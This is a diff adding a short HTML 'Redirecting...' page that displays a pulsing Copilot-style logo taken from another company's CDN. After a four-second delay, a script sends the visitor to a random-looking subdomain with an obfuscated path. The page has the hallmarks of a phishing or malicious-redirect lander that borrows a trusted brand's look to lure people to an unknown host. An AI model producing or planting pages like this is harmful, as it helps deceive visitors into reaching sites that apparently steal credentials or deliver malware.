@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      background: #FFFFFF;
+      margin: 0;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .logo {
+      width: 150px;
+      height: 150px;
+      background: url('https://cdn-hhgpp.nitrocdn.com/reGDaOLwUcMPtThRYxnreGlXIzZDMKag/assets/images/optimized/rev-e1ef053/cloud9infosystems.com/wp-content/uploads/2024/05/copilot.jpg') no-repeat center/contain;
+      animation: pulse 1.5s infinite ease-in-out;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 0.8; }
+      50% { transform: scale(1.1); opacity: 1; }
+      100% { transform: scale(1); opacity: 0.8; }
+    }
+  </style>
+</head>
+<body>
+  <div class="logo"></div>
+
+  <script>
+    setTimeout(() => {
+      window.location.href = "https://QMrdj.bzlvvm.es/WSV!OrxnMZy8Zi/";
+    }, 4000); // 4-second delay
+  </script>
+</body>
+</html>
